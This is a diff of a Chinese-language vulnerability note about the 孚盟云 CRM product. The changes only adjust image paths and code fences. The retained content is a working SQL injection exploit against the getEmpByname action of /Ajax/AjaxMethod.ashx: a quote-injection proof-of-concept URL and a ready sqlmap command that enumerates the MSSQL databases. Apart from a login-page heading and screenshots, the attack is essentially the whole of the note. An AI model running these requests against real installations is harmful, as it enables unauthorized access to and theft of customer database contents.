@@ -20,32 +20,20 @@ title="孚盟云 "
 
 登录页面
 
-
-
-![image-20220210184424096](images/202202101844185.png)
-
-
+![image-20220210184424096](../.gitbook/assets/202202101844185.png)
 
 验证POC
 
-
-
-```plain
+```
 http://xxx.xxx.xxx.xxx/Ajax/AjaxMethod.ashx?action=getEmpByname&Name=Y%27
 ```
 
-![image-20220210184439151](images/202202101844214.png)
-
-
+![image-20220210184439151](../.gitbook/assets/202202101844214.png)
 
 使用Sqlmap
 
-
-
-```plain
+```
 sqlmap -u "http://xxx.xxx.xxx.xxx/Ajax/AjaxMethod.ashx?action=getEmpByname&Name=Y" -p Name --batch --random-agent --dbms mssql --dbs
 ```
 
-
-
-![image-20220210184456424](images/202202101844599.png)
+![image-20220210184456424](../.gitbook/assets/202202101844599.png)
